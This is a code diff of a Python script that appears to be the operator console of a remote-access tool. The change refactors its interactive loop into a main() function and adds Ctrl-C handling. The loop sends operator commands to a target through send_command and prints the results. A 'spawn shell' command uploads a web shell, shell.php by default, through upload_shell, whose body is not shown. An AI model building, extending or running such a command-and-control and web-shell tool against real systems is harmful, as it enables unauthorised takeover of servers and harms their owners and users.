@@ -1,4 +1,5 @@
 import requests, json, os, base64, platform
+import sys
 
 # ANSI color codes
 GREEN = "\033[92m"
@@ -167,75 +168,92 @@ def upload_shell(session, shell_name="shell.php"):
 
 # -------- MAIN --------
 
-# check first if there is update
-check_for_update()
+def main():
+    # check first if there is update
+    check_for_update()
 
-sessions = load_sessions()
+    global sessions
+    sessions = load_sessions()
 
-if sessions:
-    banner()
-    while True:
-        choice = input(f"{BLUE}[*] Select session number, 'n' for new, or 'kill [num]': {RESET}").strip()
-        if choice.lower() == "n":
-            session = register()
-            break
-        elif choice.lower().startswith("kill "):
-            parts = choice.split()
-            if len(parts) == 2 and parts[1].isdigit():
-                kill_num = int(parts[1])
-                session_keys = list(sessions.keys())
-                if 1 <= kill_num <= len(session_keys):
-                    sid_to_kill = session_keys[kill_num-1]
-                    del sessions[sid_to_kill]
-                    save_sessions(sessions)
-                    print(f"{YELLOW}[!]{RESET} Session {sid_to_kill} removed.")
-                    # Refresh banner after kill
-                    if sessions:
-                        banner()
+    try:
+        if sessions:
+            banner()
+            while True:
+                try:
+                    choice = input(f"{BLUE}[*] Select session number, 'n' for new, or 'kill [num]': {RESET}").strip()
+                except KeyboardInterrupt:
+                    print(f"\n{YELLOW}[!]{RESET} KeyboardInterrupt detected. Exiting.")
+                    sys.exit(0)
+                if choice.lower() == "n":
+                    session = register()
+                    break
+                elif choice.lower().startswith("kill "):
+                    parts = choice.split()
+                    if len(parts) == 2 and parts[1].isdigit():
+                        kill_num = int(parts[1])
+                        session_keys = list(sessions.keys())
+                        if 1 <= kill_num <= len(session_keys):
+                            sid_to_kill = session_keys[kill_num-1]
+                            del sessions[sid_to_kill]
+                            save_sessions(sessions)
+                            print(f"{YELLOW}[!]{RESET} Session {sid_to_kill} removed.")
+                            # Refresh banner after kill
+                            if sessions:
+                                banner()
+                            else:
+                                print(f"{YELLOW}[!]{RESET} No sessions left. Registering new session...")
+                                session = register()
+                                break
+                        else:
+                            print(f"{YELLOW}[!]{RESET} Invalid session number for kill.")
                     else:
-                        print(f"{YELLOW}[!]{RESET} No sessions left. Registering new session...")
-                        session = register()
-                        break
+                        print(f"{YELLOW}[!]{RESET} Usage: kill [num]")
+                    continue
                 else:
-                    print(f"{YELLOW}[!]{RESET} Invalid session number for kill.")
-            else:
-                print(f"{YELLOW}[!]{RESET} Usage: kill [num]")
-            continue
+                    try:
+                        session_id = list(sessions.keys())[int(choice)-1]
+                        session = sessions[session_id]
+                        break
+                    except:
+                        print(f"{YELLOW}[!]{RESET} Invalid choice. Try again or use 'n' or 'kill [num]'.")
         else:
+            session = register()
+
+        print(f"{GREEN}[+]{RESET} session connected: {BLUE}{session['id']}{RESET}")
+
+        while True:
             try:
-                session_id = list(sessions.keys())[int(choice)-1]
-                session = sessions[session_id]
+                cmd = input(f"{SILVER}PX({BLUE}{session['id']}{SILVER})> {RESET}").strip()
+            except KeyboardInterrupt:
+                print(f"\n{YELLOW}[!]{RESET} KeyboardInterrupt detected. Exiting.")
                 break
-            except:
-                print(f"{YELLOW}[!]{RESET} Invalid choice. Try again or use 'n' or 'kill [num]'.")
-else:
-    session = register()
 
-print(f"{GREEN}[+]{RESET} session connected: {BLUE}{session['id']}{RESET}")
+            # Special commands
+            if cmd.lower() in ["exit", "quit"]:
+                break
+            elif cmd.lower() == "clear":
+                clear_screen()
+                continue
+            elif cmd.lower() == "about":
+                about_tool()
+                continue
+            elif cmd.lower().startswith("spawn shell"):
+                # Parse shell name if provided
+                parts = cmd.split()
+                if len(parts) == 3:
+                    shell_name = parts[2]
+                else:
+                    shell_name = "shell.php"
+                upload_shell(session, shell_name)
+                continue
 
-while True:
-    cmd = input(f"{SILVER}PX({BLUE}{session['id']}{SILVER})> {RESET}").strip()
+            # Send to target
+            send_command(session, cmd)
+            output = get_last_output(session)
+            print(f"{GREEN}{output}{RESET}")
+    except KeyboardInterrupt:
+        print(f"\n{YELLOW}[!]{RESET} KeyboardInterrupt detected. Exiting.")
+        sys.exit(0)
 
-    # Special commands
-    if cmd.lower() in ["exit", "quit"]:
-        break
-    elif cmd.lower() == "clear":
-        clear_screen()
-        continue
-    elif cmd.lower() == "about":
-        about_tool()
-        continue
-    elif cmd.lower().startswith("spawn shell"):
-        # Parse shell name if provided
-        parts = cmd.split()
-        if len(parts) == 3:
-            shell_name = parts[2]
-        else:
-            shell_name = "shell.php"
-        upload_shell(session, shell_name)
-        continue
-
-    # Send to target
-    send_command(session, cmd)
-    output = get_last_output(session)
-    print(f"{GREEN}{output}{RESET}")
+if __name__ == "__main__":
+    main()
